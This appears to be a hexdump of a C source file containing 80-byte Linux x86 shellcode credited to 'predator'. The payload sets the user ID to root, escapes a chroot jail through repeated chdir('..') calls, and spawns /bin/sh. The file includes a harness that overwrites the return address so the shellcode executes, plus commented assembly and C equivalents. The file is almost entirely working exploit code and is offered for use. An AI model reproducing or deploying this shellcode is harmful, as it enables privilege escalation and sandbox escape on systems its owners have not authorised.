00000000  2f 2a 20 54 68 69 73 20  69 73 20 4c 69 6e 75 78  |/* This is Linux|
00000010  20 63 68 72 6f 6f 74 28  29 2f 65 78 65 63 76 65  | chroot()/execve|
00000020  28 29 20 63 6f 64 65 2e  49 74 20 69 73 20 38 30  |() code.It is 80|
00000030  20 62 79 74 65 73 20 6c  6f 6e 67 2e 49 20 68 61  | bytes long.I ha|
00000040  76 65 20 73 6f 6d 65 20  20 20 20 2a 0d 0a 20 2a  |ve some    *.. *|
00000050  20 69 64 65 61 73 20 68  6f 77 20 74 6f 20 6d 61  | ideas how to ma|
00000060  6b 65 20 69 74 20 73 6d  61 6c 6c 65 72 2c 20 62  |ke it smaller, b|
00000070  75 74 20 74 69 6c 6c 20  74 68 65 6e 20 75 73 65  |ut till then use|
00000080  20 74 68 69 73 20 6f 6e  65 2e 20 20 20 20 20 20  | this one.      |
00000090  20 20 20 20 20 20 20 20  20 2a 0d 0a 20 2a 20 20  |         *.. *  |
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000000c0  20 20 20 20 20 20 20 73  69 67 6e 65 64 20 70 72  |       signed pr|
000000d0  65 64 61 74 6f 72 20 20  20 20 20 20 20 20 20 20  |edator          |
000000e0  20 20 20 20 20 20 20 2a  0d 0a 20 2a 20 20 20 20  |       *.. *    |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000110  20 20 20 20 20 6c 69 6e  75 78 20 72 65 67 69 73  |     linux regis|
00000120  74 65 72 65 64 20 75 73  65 72 20 3a 20 31 38 31  |tered user : 181|
00000130  31 31 36 20 20 2a 0d 0a  20 2a 20 20 20 20 20 20  |116  *.. *      |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000160  20 20 20 70 72 65 65 64  61 74 6f 72 28 61 74 29  |   preedator(at)|
00000170  73 65 6e 64 6d 61 69 6c  28 64 6f 74 29 72 75 20  |sendmail(dot)ru |
00000180  20 20 20 2a 0d 0a 20 2a  2a 2a 2a 2a 2a 2a 2a 2a  |   *.. *********|
00000190  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000001d0  2a 2a 2f 0d 0a 0d 0a 63  68 61 72 20 73 63 5b 5d  |**/....char sc[]|
000001e0  3d 22 5c 78 33 31 5c 78  63 30 5c 78 33 31 5c 78  |="\x31\xc0\x31\x|
000001f0  64 62 5c 78 33 31 5c 78  63 39 5c 78 62 30 5c 78  |db\x31\xc9\xb0\x|
00000200  31 37 5c 78 63 64 5c 78  38 30 5c 78 65 62 5c 78  |17\xcd\x80\xeb\x|
00000210  33 36 5c 78 35 65 5c 78  38 38 5c 78 34 36 5c 78  |36\x5e\x88\x46\x|
00000220  30 61 22 0d 0a 20 20 20  20 20 20 20 20 20 20 22  |0a"..          "|
00000230  5c 78 38 64 5c 78 35 65  5c 78 30 35 5c 78 62 31  |\x8d\x5e\x05\xb1|
00000240  5c 78 65 64 5c 78 62 30  5c 78 32 37 5c 78 63 64  |\xed\xb0\x27\xcd|
00000250  5c 78 38 30 5c 78 33 31  5c 78 63 30 5c 78 62 30  |\x80\x31\xc0\xb0|
00000260  5c 78 33 64 5c 78 63 64  5c 78 38 30 5c 78 38 33  |\x3d\xcd\x80\x83|
00000270  22 0d 0a 20 20 20 20 20  20 20 20 20 20 22 5c 78  |"..          "\x|
00000280  63 33 5c 78 30 32 5c 78  62 30 5c 78 30 63 5c 78  |c3\x02\xb0\x0c\x|
00000290  63 64 5c 78 38 30 5c 78  65 30 5c 78 66 61 5c 78  |cd\x80\xe0\xfa\x|
000002a0  62 30 5c 78 33 64 5c 78  63 64 5c 78 38 30 5c 78  |b0\x3d\xcd\x80\x|
000002b0  38 39 5c 78 37 36 5c 78  30 38 5c 78 33 31 22 0d  |89\x76\x08\x31".|
000002c0  0a 20 20 20 20 20 20 20  20 20 20 22 5c 78 63 30  |.          "\xc0|
000002d0  5c 78 38 38 5c 78 34 36  5c 78 30 37 5c 78 38 39  |\x88\x46\x07\x89|
000002e0  5c 78 34 36 5c 78 30 63  5c 78 38 39 5c 78 66 33  |\x46\x0c\x89\xf3|
000002f0  5c 78 38 64 5c 78 34 65  5c 78 30 38 5c 78 38 39  |\x8d\x4e\x08\x89|
00000300  5c 78 63 32 5c 78 62 30  5c 78 30 62 22 0d 0a 20  |\xc2\xb0\x0b".. |
00000310  20 20 20 20 20 20 20 20  20 22 5c 78 63 64 5c 78  |         "\xcd\x|
00000320  38 30 5c 78 65 38 5c 78  63 35 5c 78 66 66 5c 78  |80\xe8\xc5\xff\x|
00000330  66 66 5c 78 66 66 2f 62  69 6e 2f 73 68 2e 2e 22  |ff\xff/bin/sh.."|
00000340  3b 0d 0a 0d 0a 69 6e 74  20 6d 61 69 6e 28 29 7b  |;....int main(){|
00000350  0d 0a 20 20 69 6e 74 20  2a 72 65 74 3d 28 69 6e  |..  int *ret=(in|
00000360  74 20 2a 29 28 26 72 65  74 2b 32 29 3b 0d 0a 20  |t *)(&ret+2);.. |
00000370  20 70 72 69 6e 74 66 28  22 6c 65 6e 20 3a 20 25  | printf("len : %|
00000380  64 5c 6e 22 2c 73 74 72  6c 65 6e 28 73 63 29 29  |d\n",strlen(sc))|
00000390  3b 0d 0a 20 20 2a 72 65  74 3d 28 69 6e 74 29 73  |;..  *ret=(int)s|
000003a0  63 3b 0d 0a 7d 0d 0a 0d  0a 0d 0a 2f 2f 20 41 73  |c;..}......// As|
000003b0  6d 20 63 6f 64 65 0d 0a  2f 2a 2a 2a 2a 2a 2a 2a  |m code../*******|
000003c0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000003e0  2a 2a 2a 2a 2a 2a 0d 0a  20 2a 69 6e 74 20 6d 61  |******.. *int ma|
000003f0  69 6e 28 29 7b 20 20 20  20 20 20 20 20 20 20 20  |in(){           |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  20 20 20 20 20 2a 0d 0a  20 2a 20 5f 5f 61 73 6d  |     *.. * __asm|
00000420  5f 5f 28 22 20 78 6f 72  6c 20 25 65 61 78 2c 25  |__(" xorl %eax,%|
00000430  65 61 78 20 20 20 20 20  20 20 20 20 20 20 5c 6e  |eax           \n|
00000440  22 20 20 20 20 2a 0d 0a  20 2a 09 20 20 20 22 20  |"    *.. *.   " |
00000450  78 6f 72 6c 20 25 65 62  78 2c 25 65 62 78 20 20  |xorl %ebx,%ebx  |
00000460  20 20 20 20 20 20 20 20  20 5c 6e 22 20 20 20 20  |         \n"    |
00000470  2a 0d 0a 20 2a 20 20 20  20 20 20 20 20 20 22 20  |*.. *         " |
00000480  78 6f 72 6c 20 25 65 63  78 2c 25 65 63 78 20 20  |xorl %ecx,%ecx  |
00000490  20 20 20 20 20 20 20 20  20 5c 6e 22 20 20 20 20  |         \n"    |
000004a0  2a 0d 0a 20 2a 09 20 20  20 22 20 6d 6f 76 62 20  |*.. *.   " movb |
000004b0  24 30 78 31 37 2c 25 61  6c 20 20 20 20 20 20 20  |$0x17,%al       |
000004c0  20 20 20 20 5c 6e 22 20  20 20 20 2a 0d 0a 20 2a  |    \n"    *.. *|
000004d0  09 20 20 20 22 20 69 6e  74 20 20 24 30 78 38 30  |.   " int  $0x80|
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 5c  |               \|
000004f0  6e 22 20 20 20 20 2a 0d  0a 20 2a 20 20 20 20 20  |n"    *.. *     |
00000500  20 20 20 20 22 20 6a 6d  70 20 30 78 33 36 20 20  |    " jmp 0x36  |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 5c  |               \|
00000520  6e 22 20 20 20 20 2a 0d  0a 20 2a 20 20 20 20 20  |n"    *.. *     |
00000530  20 20 20 20 22 20 70 6f  70 6c 20 25 65 73 69 20  |    " popl %esi |
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 5c  |               \|
00000550  6e 22 20 20 20 20 2a 0d  0a 20 2a 09 20 20 20 22  |n"    *.. *.   "|
00000560  20 6d 6f 76 62 20 25 61  6c 2c 30 78 61 28 25 65  | movb %al,0xa(%e|
00000570  73 69 29 20 20 20 20 20  20 20 5c 6e 22 20 20 20  |si)       \n"   |
00000580  20 2a 0d 0a 20 2a 20 20  20 20 20 20 20 20 20 22  | *.. *         "|
00000590  20 6c 65 61 6c 20 30 78  35 28 25 65 73 69 29 2c  | leal 0x5(%esi),|
000005a0  25 65 62 78 20 20 20 20  20 20 5c 6e 22 20 20 20  |%ebx      \n"   |
000005b0  20 2a 0d 0a 20 2a 09 20  20 20 22 20 6d 6f 76 62  | *.. *.   " movb|
000005c0  20 24 30 78 65 64 2c 25  63 6c 20 20 20 20 20 20  | $0xed,%cl      |
000005d0  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
000005e0  2a 09 20 20 20 22 20 6d  6f 76 62 20 24 30 78 32  |*.   " movb $0x2|
000005f0  37 2c 25 61 6c 20 20 20  20 20 20 20 20 20 20 20  |7,%al           |
00000600  5c 6e 22 20 20 20 20 2a  0d 0a 20 2a 09 20 20 20  |\n"    *.. *.   |
00000610  22 20 69 6e 74 20 24 30  78 38 30 20 20 20 20 20  |" int $0x80     |
00000620  20 20 20 20 20 20 20 20  20 20 20 5c 6e 22 20 20  |           \n"  |
00000630  20 20 2a 0d 0a 20 2a 20  20 20 20 20 20 20 20 20  |  *.. *         |
00000640  22 20 78 6f 72 6c 20 25  65 61 78 2c 25 65 61 78  |" xorl %eax,%eax|
00000650  20 20 20 20 20 20 20 20  20 20 20 5c 6e 22 20 20  |           \n"  |
00000660  20 20 2a 0d 0a 20 2a 20  20 20 20 20 20 20 20 20  |  *.. *         |
00000670  22 20 6d 6f 76 62 20 24  30 78 33 64 2c 25 61 6c  |" movb $0x3d,%al|
00000680  20 20 20 20 20 20 20 20  20 20 20 5c 6e 22 20 20  |           \n"  |
00000690  20 20 2a 0d 0a 20 2a 09  20 20 20 22 20 69 6e 74  |  *.. *.   " int|
000006a0  20 24 30 78 38 30 20 20  20 20 20 20 20 20 20 20  | $0x80          |
000006b0  20 20 20 20 20 20 5c 6e  22 20 20 20 20 2a 20 0d  |      \n"    * .|
000006c0  0a 20 2a 09 20 20 20 22  20 61 64 64 6c 20 24 30  |. *.   " addl $0|
000006d0  78 32 2c 25 65 62 78 20  20 20 20 20 20 20 20 20  |x2,%ebx         |
000006e0  20 20 5c 6e 22 20 20 20  20 2a 0d 0a 20 2a 20 20  |  \n"    *.. *  |
000006f0  20 20 20 20 20 20 20 22  20 6d 6f 76 62 20 24 30  |       " movb $0|
00000700  78 63 2c 25 61 6c 20 20  20 20 20 20 20 20 20 20  |xc,%al          |
00000710  20 20 5c 6e 22 20 20 20  20 2a 0d 0a 20 2a 09 20  |  \n"    *.. *. |
00000720  20 20 22 20 69 6e 74 20  24 30 78 38 30 20 20 20  |  " int $0x80   |
00000730  20 20 20 20 20 20 20 20  20 20 20 20 20 5c 6e 22  |             \n"|
00000740  20 20 20 20 2a 0d 0a 20  2a 20 20 20 20 20 20 20  |    *.. *       |
00000750  20 20 22 20 6c 6f 6f 70  6e 65 20 2d 30 78 30 36  |  " loopne -0x06|
00000760  20 20 20 20 20 20 20 20  20 20 20 20 20 5c 6e 22  |             \n"|
00000770  20 20 20 20 2a 0d 0a 20  2a 20 20 20 20 20 20 20  |    *.. *       |
00000780  20 20 22 20 6d 6f 76 62  20 24 30 78 33 64 2c 25  |  " movb $0x3d,%|
00000790  61 6c 20 20 20 20 20 20  20 20 20 20 20 5c 6e 22  |al           \n"|
000007a0  20 20 20 20 2a 0d 0a 20  2a 09 20 20 20 22 20 69  |    *.. *.   " i|
000007b0  6e 74 20 24 30 78 38 30  20 20 20 20 20 20 20 20  |nt $0x80        |
000007c0  20 20 20 20 20 20 20 20  5c 6e 22 20 20 20 20 2a  |        \n"    *|
000007d0  0d 0a 20 2a 09 20 20 20  22 20 6d 6f 76 6c 20 25  |.. *.   " movl %|
000007e0  65 73 69 2c 30 78 38 28  25 65 73 69 29 20 20 20  |esi,0x8(%esi)   |
000007f0  20 20 20 5c 6e 22 20 20  20 20 2a 20 0d 0a 20 2a  |   \n"    * .. *|
00000800  20 20 20 20 20 20 20 20  20 22 20 78 6f 72 6c 20  |         " xorl |
00000810  25 65 61 78 2c 25 65 61  78 20 20 20 20 20 20 20  |%eax,%eax       |
00000820  20 20 20 20 5c 6e 22 20  20 20 20 2a 20 0d 0a 20  |    \n"    * .. |
00000830  2a 20 20 20 20 20 20 20  20 20 22 20 6d 6f 76 62  |*         " movb|
00000840  20 25 61 6c 2c 30 78 37  28 25 65 73 69 29 20 20  | %al,0x7(%esi)  |
00000850  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
00000860  2a 20 20 20 20 20 20 20  20 20 22 20 6d 6f 76 6c  |*         " movl|
00000870  20 25 65 61 78 2c 30 78  63 28 25 65 73 69 29 20  | %eax,0xc(%esi) |
00000880  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
00000890  2a 20 20 20 20 20 20 20  20 20 22 20 6d 6f 76 6c  |*         " movl|
000008a0  20 25 65 73 69 2c 25 65  62 78 20 20 20 20 20 20  | %esi,%ebx      |
000008b0  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
000008c0  2a 20 20 20 20 20 20 20  20 20 22 20 6c 65 61 6c  |*         " leal|
000008d0  20 30 78 38 28 25 65 73  69 29 2c 25 65 63 78 20  | 0x8(%esi),%ecx |
000008e0  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
000008f0  2a 20 20 20 20 20 20 20  20 20 22 20 6d 6f 76 6c  |*         " movl|
00000900  20 25 65 61 78 2c 25 65  64 78 20 20 20 20 20 20  | %eax,%edx      |
00000910  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
00000920  2a 20 20 20 20 20 20 20  20 20 22 20 6d 6f 76 62  |*         " movb|
00000930  20 24 30 78 62 2c 25 61  6c 20 20 20 20 20 20 20  | $0xb,%al       |
00000940  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
00000950  2a 20 20 20 20 20 20 20  20 20 22 20 69 6e 74 20  |*         " int |
00000960  24 30 78 38 30 20 20 20  20 20 20 20 20 20 20 20  |$0x80           |
00000970  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
00000980  2a 20 20 20 20 20 20 20  20 20 22 20 63 61 6c 6c  |*         " call|
00000990  20 2d 30 78 33 62 20 20  20 20 20 20 20 20 20 20  | -0x3b          |
000009a0  20 20 20 20 20 5c 6e 22  20 20 20 20 2a 0d 0a 20  |     \n"    *.. |
000009b0  2a 20 20 20 20 20 20 20  20 20 22 20 2e 73 74 72  |*         " .str|
000009c0  69 6e 67 20 5c 22 2f 62  69 6e 2f 73 68 2e 2e 5c  |ing \"/bin/sh..\|
000009d0  22 20 20 20 20 5c 6e 22  29 3b 20 20 2a 0d 0a 20  |"    \n");  *.. |
000009e0  2a 7d 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |*}              |
000009f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a00  20 20 20 20 20 20 20 20  20 20 20 20 2a 0d 0a 20  |            *.. |
00000a10  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000a30  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2f 20 0d  |*************/ .|
00000a40  0a 0d 0a 2f 2f 43 20 63  6f 64 65 0d 0a 2f 2a 2a  |...//C code../**|
00000a50  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000a70  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 0d 0a 2a 69  |************..*i|
00000a80  6e 74 20 6d 61 69 6e 28  29 7b 20 20 20 20 20 20  |nt main(){      |
00000a90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000aa0  20 20 20 20 20 20 20 20  20 20 20 20 2a 0d 0a 2a  |            *..*|
00000ab0  20 20 63 68 61 72 20 2a  73 68 5b 32 5d 3d 7b 22  |  char *sh[2]={"|
00000ac0  2f 62 69 6e 2f 73 68 22  2c 4e 55 4c 4c 7d 3b 20  |/bin/sh",NULL}; |
00000ad0  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000ae0  2a 20 20 69 6e 74 20 67  67 3d 30 78 65 64 20 20  |*  int gg=0xed  |
00000af0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 0d  |              *.|
00000b10  0a 2a 20 20 6d 6b 64 69  72 28 22 73 68 2e 2e 22  |.*  mkdir("sh.."|
00000b20  2c 67 67 29 3b 09 09 09  20 20 20 20 20 20 2a 0d  |,gg);...      *.|
00000b30  0a 2a 20 20 63 68 72 6f  6f 74 28 22 73 68 2e 2e  |.*  chroot("sh..|
00000b40  22 29 3b 09 09 09 20 20  20 20 20 20 2a 0d 0a 2a  |");...      *..*|
00000b50  20 20 77 68 69 6c 65 20  28 67 67 21 3d 30 29 7b  |  while (gg!=0){|
00000b60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b70  20 20 20 20 20 20 20 20  20 20 20 20 20 2a 0d 0a  |             *..|
00000b80  2a 20 20 20 20 20 63 68  64 69 72 28 22 2e 2e 22  |*     chdir(".."|
00000b90  29 3b 67 67 2d 2d 3b 20  20 20 20 20 20 20 20 20  |);gg--;         |
00000ba0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 0d  |              *.|
00000bb0  0a 2a 20 20 7d 20 20 20  20 20 20 20 20 20 20 20  |.*  }           |
00000bc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000bd0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |               *|
00000be0  0d 0a 2a 20 63 68 72 6f  6f 74 28 22 2e 2e 22 29  |..* chroot("..")|
00000bf0  3b 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |;               |
00000c00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c10  2a 0d 0a 2a 20 65 78 65  63 76 65 28 73 68 5b 30  |*..* execve(sh[0|
00000c20  5d 2c 73 68 2c 4e 55 4c  4c 29 3b 20 20 20 20 20  |],sh,NULL);     |
00000c30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000c40  20 2a 0d 0a 2a 7d 20 20  20 20 20 20 20 20 20 20  | *..*}          |
00000c50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000c70  20 20 2a 0d 0a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |  *..***********|
00000c80  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000ca0  2a 2a 2a 2a 2f                                    |****/|
00000ca5
